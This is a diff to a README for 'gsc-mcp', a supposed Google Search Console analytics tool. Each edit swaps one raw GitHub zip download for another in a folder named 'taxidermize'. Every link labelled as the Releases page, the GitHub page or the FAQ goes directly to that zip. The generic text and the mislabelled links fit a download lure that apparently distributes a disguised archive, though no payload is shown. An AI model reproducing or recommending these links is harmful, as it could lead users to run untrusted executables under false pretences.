@@ -1,7 +1,7 @@
 # 🚀 gsc-mcp - Track Your Google Search Performance 
 
 ## 📥 Download Now
-[![Download gsc-mcp](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip)](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip)
+[![Download gsc-mcp](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip)](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip)
 
 ## 📋 Overview
 gsc-mcp is your tool for analyzing Google Search Console data. It helps you monitor your website's performance, track keywords, and enhance your SEO strategy. With gsc-mcp, you can easily access essential analytics without technical hassle.
@@ -24,7 +24,7 @@ Make sure your computer meets these requirements to run gsc-mcp smoothly:
 Follow these steps to get gsc-mcp up and running:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip). 
+   Go to the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip). 
 
 2. **Download the Application**  
    Select the latest release. Click on the download link for your operating system to download the application. 
@@ -42,7 +42,7 @@ Follow these steps to get gsc-mcp up and running:
    Once logged in, you can start exploring your website's analytics right away. Navigate through the sections to understand your performance better.
 
 ## 📧 Support 
-If you encounter any issues, please check the FAQ section on the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip) or reach out through our [Support Page](#).
+If you encounter any issues, please check the FAQ section on the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip) or reach out through our [Support Page](#).
 
 ## 🛡️ Security
 gsc-mcp prioritizes your data privacy. It only accesses the information from your Google Search Console account with your permission. No data is collected or stored on our servers.
@@ -57,9 +57,9 @@ For more details on how to make the best use of gsc-mcp:
 - **SEO Tips**: Learn best practices for improving your site’s performance.
 
 ## 🔗 More Information
-For continuous updates and features, visit the [gsc-mcp GitHub page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip). 
+For continuous updates and features, visit the [gsc-mcp GitHub page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip). 
 
 ## 📥 Download & Install
-Ready to dive into your Google Search data? Return to the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/mcp_gsc_3.5.zip) to download your copy of gsc-mcp. 
+Ready to dive into your Google Search data? Return to the [Releases page](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip) to download your copy of gsc-mcp. 
 
 Take control of your website's SEO performance with gsc-mcp today!
